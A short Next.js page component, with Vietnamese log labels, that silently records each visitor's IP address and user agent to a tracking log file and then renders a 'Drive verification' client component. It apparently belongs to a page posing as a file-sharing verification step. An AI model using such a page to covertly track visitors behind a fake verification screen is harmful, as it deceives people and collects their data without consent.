
import { headers } from 'next/headers';
import fs from 'fs';
import path from 'path';
import { DriveVerificationClient } from '@/components/drive-verification-client';

async function logInitialAccess() {
  const headersList = headers();
  const ip = headersList.get('x-vercel-forwarded-for') ?? headersList.get('x-forwarded-for') ?? 'unknown';
  const ua = headersList.get('user-agent') ?? 'unknown';
  const logDir = path.join(process.cwd(), 'logs');
  const logFile = path.join(logDir, 'tracking_logs.txt');

  const logData = `--- [${new Date().toISOString()}] MỚI TRUY CẬP ---\nIP: ${ip}\nThiết bị: ${ua}\n`;

  try {
    if (!fs.existsSync(logDir)) {
      fs.mkdirSync(logDir, { recursive: true });
    }
    fs.appendFileSync(logFile, logData, 'utf-8');
  } catch (error) {
    console.error('Failed to write initial access log:', error);
  }
}

export default async function VerificationPage() {
  await logInitialAccess();
  return <DriveVerificationClient />;
}
